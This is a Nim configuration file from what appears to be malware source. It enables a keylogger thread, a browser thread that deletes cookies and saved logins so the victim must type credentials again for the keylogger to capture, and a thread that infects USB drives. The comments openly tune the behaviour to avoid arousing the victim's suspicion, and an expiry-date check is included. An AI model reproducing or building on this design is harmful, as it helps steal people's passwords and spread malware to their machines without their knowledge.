## this file contains flags and other options
## used by the program

## keyloggerThread is used for logging key presses
const USE_KEYLOGGER_THREAD*: bool = true

## browserThread is used for deleting cookies and login data
## so the user is forced to login back again
## best used alongside keyloggerThread
## DEFAULT: true
const USE_BROWSER_THREAD*: bool = true

## when `true` browserThread will remove cookies
## and other files instead of renaming them
## use `false` only for testing purposes only so no data is lost
## DEFAULT: true
const BROWSER_THREAD_REMOVE_FILE*: bool = false

## infectThread will search for usb drives and infect them
const USE_INFECT_THREAD*: bool = true

## TODO: IMPLEMENT THE FOLLOWING LINES

type browserThreadStart = enum
  Always ## NOT RECOMMENDED
  Random ## 1 in 6 chance browserThread will start

## how the browserThread starts
## setting Always will delete browser files everytime the
## program starts, not recommended, the victim will suspect
## something's up immediately
## DEFAULT: Random
const BROWSER_THREAD_START_TYPE*: browserThreadStart = Random

type ExpireVerification* = enum
  LocalApi
  InternetApi

type Date* = object
  day: int
  month: int
  year: int

proc NewDate(day: int, month: int, year: int): Date =
  result = Date()

  result.day = day
  result.month = month
  result.year = year

const USE_EXPIRE_VERIFICATION*: bool = true

const EXPIRE_VERIFICATION_TYPE*: ExpireVerification = LocalApi

const EXPIRE_DATE*: Date = NewDate(20, 10, 2020)
